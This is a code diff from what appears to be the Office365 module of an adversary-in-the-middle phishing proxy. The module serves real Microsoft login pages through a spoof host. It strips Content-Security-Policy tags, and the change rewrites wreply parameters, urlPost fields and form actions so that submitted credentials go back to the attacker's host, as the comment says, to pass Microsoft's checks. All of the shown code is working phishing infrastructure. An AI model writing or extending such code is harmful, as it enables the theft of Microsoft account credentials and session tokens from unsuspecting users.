@@ -1013,16 +1013,14 @@ class Office365Module(BaseModule):
                     # Remove any inline meta CSP tags (already present earlier)
                     content_str = re.sub(r'<meta[^>]+http-equiv=["\"]Content-Security-Policy["\"][^>]*>', '', content_str, flags=re.IGNORECASE)
                     
-                    # Broad regex rewrite -> /proxy/
-                    def _rewrite(match):
-                        url = match.group(0)
-                        proto_removed = re.sub(r'^https?:\/\/', '', url)
-                        path_part = '/'.join(proto_removed.split('/')[1:])
-                        return f"/proxy/{path_part}"
-                    
-                    pattern = r"https?:\/\/[A-Za-z0-9\-.]*(live\.com|microsoft\.com)/(?:[A-Za-z0-9_\-./?=&%+]*)"
-                    content_str = re.sub(pattern, _rewrite, content_str)
-                    
+                    # ------------------------------------------------------------------
+                    # Fix hidden wreply parameters, urlPost JS fields, and form actions
+                    # so they point back to our spoof host (Microsoft checks these).
+                    # ------------------------------------------------------------------
+                    content_str = re.sub(r'([?&])wreply=/proxy/', lambda m: f"{m.group(1)}wreply=https://{current_host}/proxy/", content_str, flags=re.IGNORECASE)
+                    content_str = re.sub(r"urlPost:['\"]/proxy/", f"urlPost:'https://{current_host}/proxy/", content_str, flags=re.IGNORECASE)
+                    content_str = re.sub(r'action="/proxy/', f'action="https://{current_host}/proxy/', content_str, flags=re.IGNORECASE)
+
                     content = content_str.encode('utf-8')
                     self.log(f"[AiTM] Serving REAL Microsoft page after URL rewrite to /proxy path")
                     
